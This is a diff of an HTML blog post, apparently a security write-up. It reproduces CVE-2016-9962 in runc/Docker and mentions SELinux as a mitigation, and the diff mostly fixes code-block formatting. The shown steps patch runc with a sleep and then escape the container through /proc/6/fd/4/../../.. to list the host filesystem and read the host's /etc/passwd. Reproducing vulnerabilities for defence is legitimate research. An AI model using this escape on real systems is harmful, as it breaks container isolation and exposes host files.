@@ -72,6 +72,8 @@
 <p>Here we described how to reproduce CVE-2016-9962(vulnerability for Docker) and
 how can we protect it by using SELinux.</p>
 
+<p>(Written by Kazuki Omo:ka-omo@sios.com).</p>
+
 <hr />
 
 <h2 id="reference">Reference</h2>
@@ -92,9 +94,7 @@ checking other container&rsquo;s status.</p>
 <li><p>Install docker, runc on your PC.</p>
 
 <pre><code>[root@localhost ~]# rpm -qa|grep -i docker
-</code></pre>
-
-<p>golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
+golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
 golang-github-docker-go-unit-test-devel-1.5.1-0.3.gitd30aec9.fc25.x86_64
 golang-github-docker-go-devel-1.5.1-0.3.gitd30aec9.fc25.noarch
 docker-devel-1.12.6-3.git51ef5a8.fc25.noarch
@@ -103,12 +103,12 @@ docker-1.12.6-4.gitf499e8b.fc25.x86_64
 golang-github-docker-libcontainer-2.1.1-0.8.gitc964368.fc25.x86_64
 golang-github-docker-go-connections-devel-0.1.2-0.2.git6e4c13d.fc25.noarch
 docker-common-1.12.6-4.gitf499e8b.fc25.x86_64
-golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc2
-5.x86_64
+golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc25.x86_64
 golang-github-docker-go-units-devel-0.2.0-3.fc25.noarch
 [root@localhost ~]# rpm -qa|grep -i runc
 runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64
-runc-devel-0.1.1-4.git57b9972.fc25.noarch</p></li>
+runc-devel-0.1.1-4.git57b9972.fc25.noarch
+</code></pre></li>
 
 <li><p>Start docker.</p>
 
@@ -129,20 +129,18 @@ runc-devel-0.1.1-4.git57b9972.fc25.noarch</p></li>
 , &ldquo;small_lumiere&rdquo; is the name.</p>
 
 <pre><code>[root@localhost ~]# docker ps -a
-</code></pre>
-
-<p>[root@localhost ~]# docker ps -a
-CONTAINER ID        IMAGE               COMMAND             CREATED<br />
+[root@localhost ~]# docker ps -a
+CONTAINER ID        IMAGE               COMMAND             CREATED         
 STATUS              PORTS               NAMES
-965456106c88        alpine              &ldquo;&ndash;name alpine&rdquo;     6 hours ago<br />
-Created                                 small_lumiere</p></li>
+965456106c88        alpine              &quot;--name alpine&quot;     6 hours ago     
+Created                                 small_lumiere
+</code></pre></li>
 
 <li><p>create &ldquo;rootfs&rdquo; directory and copy all of alpine file under rootfs/</p>
 
 <pre><code>[root@localhost ~]# mkdir rootfs
-</code></pre>
-
-<p>[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs</p></li>
+[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs
+</code></pre></li>
 
 <li><p>create config.json</p>
 
@@ -159,13 +157,9 @@ Created                                 small_lumiere</p></li>
             ],
 </code></pre></li>
 
-<li><p>For PoC, we will modify runc source. Get/install runc SRPM and modify sourc
-e code.</p>
+<li><p>For PoC, we will modify runc source. Get/install runc SRPM and modify source code.</p>
 
-<pre><code>[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.r
-</code></pre>
-
-<p>pm
+<pre><code>[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.rpm
 [root@localhost ~]# cd SOURCES/
 [root@localhost ~]# ls
 runc-c91b5be.tar.gz
@@ -185,56 +179,46 @@ Makefile              exec.go        ps.go                tty.go
 NOTICE                kill.go        restore.go           update.go
 PRINCIPLES.md         libcontainer   rlimit_linux.go      utils.go
 README.md             list.go        run.go               utils_linux.go
-[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontai
-ner/setns_init_linux.go</p></li>
+[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontainer/setns_init_linux.go 
+</code></pre></li>
 
 <li><p>We add 2 lines ;</p>
 
-<pre><code>[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_
-</code></pre>
+<pre><code>[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_linux.go.org 
+    --- setns_init_linux.go     2017-01-16 15:26:01.067477093 +0900
+    +++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
+    @@ -5,6 +5,7 @@
+import (
+    &quot;fmt&quot;
+    &quot;os&quot;
++   &quot;time&quot;
 
-<p>linux.go.org
-&mdash; setns_init_linux.go 2017-01-16 15:26:01.067477093 +0900
-+++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
-@@ -5,6 +5,7 @@
- import (
-    &ldquo;fmt&rdquo;
-    &ldquo;os&rdquo;</p>
-
-<ul>
-<li><p>&ldquo;time&rdquo;</p>
-
-<p>&ldquo;github.com/opencontainers/runc/libcontainer/apparmor&rdquo;
-&ldquo;github.com/opencontainers/runc/libcontainer/keys&rdquo;
-@@ -49,5 +50,6 @@
-if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
-    return err
-}</p></li>
-
-<li><p>time.Sleep(500 * time.Second)
-return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
-}</p></li>
-</ul></li>
+    &quot;github.com/opencontainers/runc/libcontainer/apparmor&quot;
+    &quot;github.com/opencontainers/runc/libcontainer/keys&quot;
+    @@ -49,5 +50,6 @@
+    if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
+        return err
+    }
++   time.Sleep(500 * time.Second)
+    return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
+ }
+</code></pre></li>
 
 <li><p>make tar.gz and re-create runc package by using rpmbuild.</p>
 
-<pre><code>[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7
-</code></pre>
-
-<p>882d7455d59518cdf70ec
+<pre><code>[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7882d7455d59518cdf70ec
 [root@localhost work]# gzip runc-c91b5be.tar
 [root@localhost work]# cp runc-c91b5be.tar.gz ../SOURCES
 [root@localhost work]# cd ../SPECS/
 [root@localhost SPECS]# rpmbuild -ba runc.spec
-[root@localhost SPECS]# cd ~</p></li>
+[root@localhost SPECS]# cd ~
+</code></pre></li>
 
 <li><p>uninstall and re-install modified runc package;</p>
 
 <pre><code>[root@localhost ~]# rpm -e runc
-</code></pre>
-
-<p>[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5b
-e.fc25.x86_64.rpm</p></li>
+[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64.rpm
+</code></pre></li>
 </ol>
 
 <hr />
@@ -247,16 +231,14 @@ e.fc25.x86_64.rpm</p></li>
 <li><p>Check SELinux is enabled;</p>
 
 <pre><code>[root@localhost ~]# getenforce
-</code></pre>
-
-<p>Enforcing</p></li>
+Enforcing
+</code></pre></li>
 
 <li><p>run container(sh) in shell1;</p>
 
 <pre><code>[root@localhost ~]# runc run ctr
-</code></pre>
-
-<p>/ #</p></li>
+/ # 
+</code></pre></li>
 
 <li><p>run new container in shell2 with &ldquo;runc exec&rdquo; command. It is pausing 500sec;</p>
 
@@ -266,54 +248,49 @@ e.fc25.x86_64.rpm</p></li>
 <li><p>run &ldquo;ps ax&rdquo; in shell1. You can see shell2 process;</p>
 
 <pre><code>[root@localhost ~]# runc run ctr
-</code></pre>
-
-<p>/ # ps ax
+/ # ps ax
 PID   USER     TIME   COMMAND
     1 root       0:00 sh
     6 root       0:00 /proc/self/exe init
    11 root       0:00 ps ax
-/ #</p></li>
+/ # 
+</code></pre></li>
 
 <li><p>In above case, check /proc/6/fd by ls command. You see path as fd/4;</p>
 
 <pre><code>/ # ls -la /proc/6/fd/
-</code></pre>
-
-<p>total 0
-dr-x&mdash;&mdash;    2 root     root             0 Jan 16 06:43 .
+total 0
+dr-x------    2 root     root             0 Jan 16 06:43 .
 dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
-lrwx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 0 -&gt; /dev/pts/4
-lrwx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 1 -&gt; /dev/pts/4
-lrwx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 2 -&gt; /dev/pts/4
-lrwx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 3 -&gt; socket:[40487]
-lr-x&mdash;&mdash;    1 root     root            64 Jan 16 06:43 4 -&gt; /run/runc/ctr
-lrwx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 5 -&gt; /dev/pts/4
-lr-x&mdash;&mdash;    1 root     root            64 Jan 16 06:43 6 -&gt; pipe:[40496]
-l-wx&mdash;&mdash;    1 root     root            64 Jan 16 06:43 7 -&gt; /dev/null
-/ #</p></li>
+lrwx------    1 root     root            64 Jan 16 06:43 0 -&gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 1 -&gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 2 -&gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 3 -&gt; socket:[40487]
+lr-x------    1 root     root            64 Jan 16 06:43 4 -&gt; /run/runc/ctr
+lrwx------    1 root     root            64 Jan 16 06:43 5 -&gt; /dev/pts/4
+lr-x------    1 root     root            64 Jan 16 06:43 6 -&gt; pipe:[40496]
+l-wx------    1 root     root            64 Jan 16 06:43 7 -&gt; /dev/null
+/ # 
+</code></pre></li>
 
-<li><p>Check &ldquo;/proc/6/fd/4/../../..&rdquo; by ls command. You can see parent(host) / file
-system;</p>
+<li><p>Check &ldquo;/proc/6/fd/4/../../..&rdquo; by ls command. You can see parent(host) / filesystem;</p>
 
 <pre><code>/ # ls -l /proc/6/fd/4/../../..
-</code></pre>
-
-<p>total 64
+total 64
 lrwxrwxrwx    1 root     root             7 Feb  3  2016 bin -&gt; usr/bin
 dr-xr-xr-x    6 root     root          4096 Jan 16 00:07 boot
 drwxr-xr-x   19 root     root          3840 Jan 16 05:57 dev
 drwxr-xr-x  130 root     root         12288 Jan 16 05:40 etc
-drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home</p></li>
+drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home
+</code></pre></li>
 
 <li><p>You can also read /etc/passwd by using &ldquo;cat /proc/6/fd/4/../../../etc&rdquo;;</p>
 
 <pre><code>/ # cat /proc/6/fd/4/../../../etc/passwd
-</code></pre>
-
-<p>root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin</p></li>
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</code></pre></li>
 </ul>
 
 <hr />
